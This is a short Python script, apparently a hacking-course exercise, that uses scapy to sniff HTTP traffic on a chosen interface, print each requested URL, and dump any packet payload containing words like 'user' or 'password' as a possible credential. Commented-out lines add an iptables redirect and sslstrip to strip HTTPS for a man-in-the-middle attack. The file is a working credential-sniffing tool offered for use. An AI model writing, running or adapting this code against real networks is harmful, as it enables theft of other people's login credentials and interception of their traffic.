#install libraries - scapy, scapy_http, sslstrip
import scapy.all as scapy
from scapy.layers import http
import argparse
# uncomment to work against https
#import subprocess
#subprocess.call(iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000)
#subproces.call(sslstrip)

parser=argparse.ArgumentParser()	
parser.add_argument("-i","--interface",dest="interface",help="Specify an interface to capture packets")
options = parser.parse_args()

def sniff(interface):
	scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet)

def geturl(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
	if packet.haslayer(scapy.Raw):
		load = packet[scapy.Raw].load
		keywords = ['login','LOGIN','user','pass','username','password','Login', 'USERNAME', 'USER', 'PASS', 'PASSWORD']
		for keyword in keywords:
			if keyword in str(load):
				return load

def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		url=geturl(packet)
		print("[+]HTTPRequest > "+ str(url))
		logininfo = get_login_info(packet)
		if logininfo:
			print("\n\n[+]Possible username and password "+ str(logininfo) +"\n\n")
sniff(options.interface)
#Do ip --flush in terminal after program ends to clear ip table

		

